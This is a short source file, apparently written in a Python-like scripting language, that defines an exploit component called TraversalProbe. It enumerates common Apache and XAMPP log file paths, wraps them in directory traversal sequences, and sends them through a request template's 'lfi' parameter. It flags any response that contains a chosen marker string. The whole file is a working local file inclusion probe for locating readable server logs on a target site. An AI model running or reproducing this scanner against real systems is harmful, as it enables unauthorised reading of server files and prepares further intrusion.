import('urllib2');

class init ExploitComponent TraversalProbe {
    dirs = [
        [ 'apache', 'logs' ],
        [ 'apache2', 'logs' ],
        [ 'etc', 'httpd', 'logs' ],
        [ 'opt', 'lampp', 'logs' ],
        [ 'usr', 'local', 'apache', 'logs' ],
        [ 'var', 'log' ],
        [ 'var', 'log', 'apache' ],
        [ 'var', 'log', 'apache2' ],
        [ 'var', 'log', 'httpd' ],
        [ 'var', 'www', 'logs' ],
        [ 'xampp', 'apache', 'logs' ],
    ],

    names = [
        'access.log',
        'access_log',
        'acces.log',
        'acces_log',
        'error.log',
        'error_log'
    ],

    __init__: @(
        searchValue,
        reqTmpl,        
        dot='.',
        separator = '/',
        terminator = '',
        min = 0,
        max = 8) {
        self.files = self.createPaths();
	},

	createPaths: @()
		self.dirs
		@selectMany(@(x) self.names @select(@(y) x + [y])),

    seqs: @()
        TraversalRange(self.files, self.min, self.max, self.dot,
                       self.separator, self.terminator),

    scan: @{
        for (x in self.seqs()) {
            r = self.testSeq(x);
            if (r != null) ret r;
		}
	},

    testSeq: @(seq) {
        values = { lfi: seq };
        url = self.reqTmpl.getUrl(values);         
        self.log('[?] %s' % url);
        data = self.reqTmpl.getPost(values);
        if (data != null) self.log('    ' + str(data));        
        resp = urllib2.urlopen(url, data).read();
		t = url, data;
        ret resp.__contains__(self.searchValue) ? t : null;
	},
};